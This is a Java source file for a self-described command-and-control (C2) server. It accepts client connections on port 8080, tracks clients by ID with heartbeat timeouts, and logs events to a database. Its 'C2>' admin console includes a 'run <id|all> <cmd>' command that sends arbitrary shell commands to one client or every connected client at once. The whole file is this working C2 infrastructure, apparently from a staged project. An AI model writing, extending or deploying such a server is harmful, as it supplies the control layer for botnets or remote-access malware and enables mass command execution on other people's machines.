import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * Main C2 server component.
 *
 * The server is responsible for:
 * - Initializing the DatabaseManage component for logging and persistence
 * - Accepting incoming client connections on port 8080 using a fixed Thread Pool (ExecutorService)
 * - Assigning each client a unique ID using an atomic counter for thread safety
 * - Managing active connections within a ConcurrentHashMap
 * - Spawning a dedicated ClientHandler for each connection to process tasks asynchronously
 * - Providing a CLI interface (runAdminCLI) for administrative control 
 *   (status, kill <id|all>, run <id|all> <cmd>, exit)
 * - Running a background heartbeat-monitoring daemon thread that detects 
 *   and disconnects inactive clients based on last activity timestamps
 * - Logging all major events and administrative commands to the database
 *
 * The server handles administrative commands and client communication 
 * concurrently, ensuring the main connection loop remains non-blocking.
 */

public class Server {

    private static final int PORT = 8080;
    private static final int MAX_THREADS = 200;
    private static final ExecutorService pool = Executors.newFixedThreadPool(MAX_THREADS);
    // Store active connections
    public static final ConcurrentHashMap<Integer, ClientHandler> clients = new ConcurrentHashMap<>();
    private static final AtomicInteger clientIdCounter = new AtomicInteger(1); //Atomic integer for safe concurrency
    private static ServerSocket serverSocket;
    private static volatile boolean running = true;
    private static Thread adminThread;

    public static void main(String[] args) {
        DatabaseManage.initialize();
        System.out.println("Starting Server...");
        try {
            serverSocket = new ServerSocket(PORT);
            System.out.println("Server listening on port " + PORT);
            
            // Admin thread handles CLI commands
            adminThread = new Thread(Server::runAdminCLI);
            adminThread.start();

            // Heartbeat Monitor Thread
            Thread heartbeatMonitor = new Thread(() -> {
                while (running) {
                    try {
                        Thread.sleep(30000); // Check every 30 seconds
                        long now = System.currentTimeMillis();
                        for (ClientHandler handler : clients.values()) {
                            if ((now - handler.getLastHeartbeat()) > 60000) {
                                System.out.println("\n[WARNING] Client " + handler.getClientId() + " timed out.");
                                DatabaseManage.logEvent("Client " + handler.getClientId() + " timed out due to missing heartbeats.");
                                handler.disconnect();
                            }
                        }
                    } catch (InterruptedException e) {
                        break;
                    }
                }
            });
            heartbeatMonitor.setDaemon(true);
            heartbeatMonitor.start();
            
            // Accept connections loop
            while (running) {
                try {
                    Socket clientSocket = serverSocket.accept();
                    int clientId = clientIdCounter.getAndIncrement();
                    ClientHandler handler = new ClientHandler(clientId, clientSocket);
                    clients.put(clientId, handler);
                    pool.execute(handler);
                    System.out.println("\n[INFO] Client " + clientId + " connected.");
                    
                    //DB
                    DatabaseManage.logEvent("Client " + clientId + " connected from " + clientSocket.getInetAddress());
                    System.out.print("C2> ");
                } catch (IOException e) {
                    if (running) {
                        System.err.println("Error accepting connection: " + e.getMessage());
                    }
                }
            }
            
        } catch (IOException e) {
            System.err.println("Could not listen on port " + PORT);
        } finally {
            shutdown();
            try {
                if (adminThread != null) adminThread.join();
            } catch (InterruptedException ignored) {}
        }
    }
    
    private static void runAdminCLI() {
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
        System.out.print("C2> ");
        while (running) {
            try {
                if (reader.ready()) {
                    String input = reader.readLine();
                    if (input != null) {
                        input = input.trim();
                        if (!input.isEmpty()) {
                            final String finalInput = input;
                            pool.execute(() -> processCommand(finalInput));
                        }
                    }
                    if (running) {
            System.out.print("C2> ");
                    }
                } else {
                    Thread.sleep(50);
                }
            } catch (IOException | InterruptedException e) {
                if (!running) break;
            }
        }
    }
    
    private static void processCommand(String input) {
            String[] parts = input.split(" ", 3);
            String command = parts[0].toLowerCase();
            
            switch (command) {
                case "status":
                    System.out.println("[STATUS] Active Clients: " + clients.size());
                    DatabaseManage.logCommand(DatabaseManage.SERVER_ID,"status",""+clients.size());
                    break;
                    
                case "kill":
                    if (parts.length < 2) {
                        System.out.println("[ERROR] Usage: kill <clientId|all>");
                    } else if (parts[1].equalsIgnoreCase("all")) {
                        int killed = 0;
                        for (ClientHandler handler : clients.values()) {
                            DatabaseManage.logCommand(handler.getClientId(), "KILL", "Force disconnect all");
                            handler.disconnect();
                            killed++;
                        }
                        System.out.println("[INFO] Sent disconnect to " + killed + " clients.");
                    } else {
                        try {
                            int id = Integer.parseInt(parts[1]);
                            ClientHandler handler = clients.get(id);
                            if (handler != null) {
                                DatabaseManage.logCommand(id, "KILL", "Force disconnect");
                                handler.disconnect();
                                System.out.println("[INFO] Killed client " + id);
                            } 
                            else {
                                System.out.println("[ERROR] Client " + id + " not found.");
                            }
                        } 
                        catch (NumberFormatException e) {
                            System.out.println("[ERROR] Invalid Client ID format.");
                        }
                    }
                    break;
                    
                case "run":
                    if (parts.length < 3) {
                        System.out.println("[ERROR] Usage: run <clientId|all> <command>");
                    } 
                    else {
                        String target = parts[1];
                        String shellCommand = parts[2]; 
                        if (target.equalsIgnoreCase("all")) {
                            for (ClientHandler handler : clients.values()) {
                                handler.sendMessage("RUN " + shellCommand);
                                DatabaseManage.logCommand(handler.getClientId(), "RUN", shellCommand);
                            }
                            System.out.println("[INFO] Sent command to all active clients.");
                        } else {
                            try {
                                int id = Integer.parseInt(target);
                                ClientHandler handler = clients.get(id);
                                if (handler != null) {
                                    handler.sendMessage("RUN " + shellCommand);
                                    DatabaseManage.logCommand(id, "RUN", shellCommand);
                                    System.out.println("[INFO] Sent command to client " + id);
                                } else {
                                    System.out.println("[ERROR] Client " + id + " not found.");
                                }
                            } catch (NumberFormatException e) {
                                System.out.println("[ERROR] Invalid Client ID format.");
                            }
                        }
                    }
                //Phase 1:echo
                    // if (parts.length < 3) {
                    //     System.out.println("[ERROR] Usage: echo <clientId|all> <message>");
                    // } else {
                    //     String target = parts[1];
                    //     String msg = parts[2];
                    //     if (target.equalsIgnoreCase("all")) {
                    //         for (ClientHandler handler : clients.values()) {
                    //             handler.sendMessage("ECHO " + msg);
                    //             DatabaseManage.logCommand(handler.getClientId(), "ECHO", msg);
                    //         }
                    //         System.out.println("[INFO] Sent echo to all active clients.");
                    //     } else {
                    //         try {
                    //             int id = Integer.parseInt(target);
                    //             ClientHandler handler = clients.get(id);
                    //             if (handler != null) {
                    //                 handler.sendMessage("ECHO " + msg);
                    //                 DatabaseManage.logCommand(id, "ECHO", msg);
                    //                 System.out.println("[INFO] Sent echo to client " + id);
                    //             } else {
                    //                 System.out.println("[ERROR] Client " + id + " not found.");
                    //             }
                    //         } catch (NumberFormatException e) {
                    //             System.out.println("[ERROR] Invalid Client ID format.");
                    //         }
                    //     }
                    // }
                    break;
                    
                case "exit":
                System.out.println("Initiating shutdown...");
                    DatabaseManage.logCommand(DatabaseManage.SERVER_ID, "exit", "Shutdown server");
                    running = false;
                    shutdown();
                break;
                    
                default:
                    System.out.println("[ERROR] Unknown command. Available: status | kill <id|all> | run <id|all> <cmd> | exit");
            }
    }
    
    public static void removeClient(int clientId) {
        clients.remove(clientId);
    }
    
    private static void shutdown() {
        running = false;
        try {
            if (serverSocket != null && !serverSocket.isClosed()) {
                serverSocket.close();
            }
            for (ClientHandler handler : clients.values()) {
                handler.disconnect();
            }
            pool.shutdownNow(); // Using shutdownNow to interrupt any blocking threads
        } 
        catch (IOException e) {
            System.err.println("Error during shutdown: " + e.getMessage());
        }
        DatabaseManage.close();
        System.out.println("Server shutdown complete.");
        System.exit(0);
    }
}
